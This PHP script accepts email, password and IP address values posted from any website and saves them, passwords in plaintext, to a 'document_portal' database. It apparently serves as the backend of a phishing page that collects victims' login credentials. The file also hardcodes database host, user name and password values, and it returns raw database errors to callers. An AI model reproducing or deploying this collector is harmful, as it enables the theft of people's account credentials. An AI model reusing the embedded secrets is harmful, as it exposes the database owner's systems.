<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight requests
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Database configuration - UPDATE THESE WITH YOUR CREDENTIALS
$servername = "sql206.ezyro.com";
$username = "ezyro_40589118"; // Change if different
$password = "8b90afc4d0"; // Change if you have a password
$dbname = "ezyro_40589118_document_portal";

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($conn->connect_error) {
    error_log("Connection failed: " . $conn->connect_error);
    echo json_encode(['success' => false, 'error' => 'Database connection failed: ' . $conn->connect_error]);
    exit();
}

// Get raw POST data
$input = file_get_contents('php://input');
$data = json_decode($input, true);

// Log received data for debugging
error_log("Received data: " . print_r($data, true));

if ($data && isset($data['email']) && isset($data['password'])) {
    try {
        // Prepare data for insertion
        $email = $conn->real_escape_string(trim($data['email']));
        $password = $conn->real_escape_string(trim($data['password']));
        $ip_address = $conn->real_escape_string($data['ip_address'] ?? $_SERVER['REMOTE_ADDR']);
        
        // Create table if it doesn't exist
        $createTableSQL = "CREATE TABLE IF NOT EXISTS form_submissions (
            id INT AUTO_INCREMENT PRIMARY KEY,
            email VARCHAR(255) NOT NULL,
            password VARCHAR(255) NOT NULL,
            ip_address VARCHAR(45),
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )";
        
        if (!$conn->query($createTableSQL)) {
            error_log("Create table error: " . $conn->error);
        }
        
        // Insert into form_submissions table
        $sql = "INSERT INTO form_submissions (email, password, ip_address) 
                VALUES (?, ?, ?)";
        
        // Use prepared statement to prevent SQL injection
        $stmt = $conn->prepare($sql);
        if (!$stmt) {
            error_log("Prepare failed: " . $conn->error);
            echo json_encode(['success' => false, 'error' => 'Prepare failed: ' . $conn->error]);
            exit();
        }
        
        $stmt->bind_param("sss", $email, $password, $ip_address);
        
        if ($stmt->execute()) {
            $insert_id = $stmt->insert_id;
            echo json_encode([
                'success' => true, 
                'message' => 'Data stored successfully',
                'insert_id' => $insert_id
            ]);
            error_log("Data inserted successfully with ID: " . $insert_id);
        } else {
            error_log("Execute failed: " . $stmt->error);
            echo json_encode(['success' => false, 'error' => 'Insert failed: ' . $stmt->error]);
        }
        
        $stmt->close();
        
    } catch (Exception $e) {
        error_log("Exception: " . $e->getMessage());
        echo json_encode(['success' => false, 'error' => 'Exception: ' . $e->getMessage()]);
    }
} else {
    error_log("Invalid or missing data received");
    echo json_encode(['success' => false, 'error' => 'Invalid or missing data. Required: email, password']);
}

$conn->close();
?>